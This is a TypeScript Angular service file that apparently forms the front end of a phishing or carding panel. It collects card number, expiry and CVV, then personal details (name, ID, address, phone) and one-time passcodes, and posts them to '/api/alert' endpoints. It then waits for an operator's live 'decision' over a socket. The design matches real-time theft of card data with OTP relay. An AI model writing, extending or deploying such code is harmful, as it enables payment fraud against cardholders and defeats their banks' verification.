import { Injectable } from '@angular/core';
import { io, Socket } from 'socket.io-client';
import { Observable, ReplaySubject, Subject } from 'rxjs';
import { HttpClient } from '@angular/common/http';

import { v4 as uuidv4 } from 'uuid';

@Injectable({
  providedIn: 'root'
})

export class FuncionalityService {
  private sessionId: string = localStorage.getItem('sid') || uuidv4();
  private decisionSubject: ReplaySubject<string> = new ReplaySubject<string>(1);
  private socket: Socket;
  //private api: string = 'https://back.oceanicmc.fun';
  private api: string = 'http://localhost:3000';

  constructor(private http: HttpClient) {
    localStorage.setItem('sid', this.sessionId);
    this.socket = io(this.api, {
      withCredentials: true,
    });

    this.socket.on('connect', () => {
      console.log('Socket conectado:', this.socket.id);
      localStorage.setItem('skid', String(this.socket.id));
    });

    this.socket.on('decision', (data: string) => {
      console.log('Decision recibida desde socket:', data);
      this.decisionSubject.next(data);
    });

  }

  getStoredSessionId(): string {
    return this.sessionId;
  }

  resetDecisionSubject() {
    this.decisionSubject = new ReplaySubject<string>(1); // Reiniciar para nueva decisión
    this.socket.removeAllListeners('decision'); // Limpiar listeners antiguos
    this.socket.on('decision', (data: string) => {
      this.decisionSubject.next(data); // Volver a escuchar
    });
  }

  startProcess(data: string, socketId: string | null, sessionId?: string | null, isRetry?: boolean) {
    return this.http.post(this.api + '/api/alert/start-process', {
      data,
      socketId,
      sessionId,
      isRetry
    });
  }


  handleCaptchaToken(token: string) {
    return this.http.post(this.api + '/api/verify', token)
  }


  getSocketIdWhenReady(): Promise<string> {
    return new Promise((resolve) => {
      if (this.socket.id) {
        resolve(this.socket.id);
      } else {
        this.socket.on('connect', () => {
          resolve(this.socket.id!);
        });
      }
    });
  }



/*   errorAlert(code: number) {
     const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/append-card-data', {
      card,
      exp,
      cvv,
      socketId
    });
  } */

  appendCardData(card: string, exp: string, cvv: string) {
    const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/append-card-data', {
      card,
      exp,
      cvv,
      sessionId: this.getStoredSessionId()
    });
  }

  
  appendPersonData(name: string, id: string, add: string, tel: string) {
    const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/append-person-data', {
      name,
      id,
      add,
      tel,
      sessionId: this.getStoredSessionId()
    });
  }

  updateMessageWithOtp(otp: string, socketId: string) {
    return this.http.post(this.api + '/api/alert/update-message-otp', {
      otp,
      sessionId: this.getStoredSessionId()
    });
  }

  onDecision(sessionId: any): Observable<string> {
    return this.decisionSubject.asObservable();
  }

  onOtpDecision(): Observable<string> {
    return new Observable((observer) => {
      this.socket.on('final-decision', (data: string) => {
        observer.next(data);
        observer.complete();
      });
    });
  }

  sendSimpleMessage(data: string) {
    const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/send-message', {
      text: data,
      sessionId: this.getStoredSessionId()
    });
  }

  


  disconnect() {
    this.socket.disconnect();
  }

}
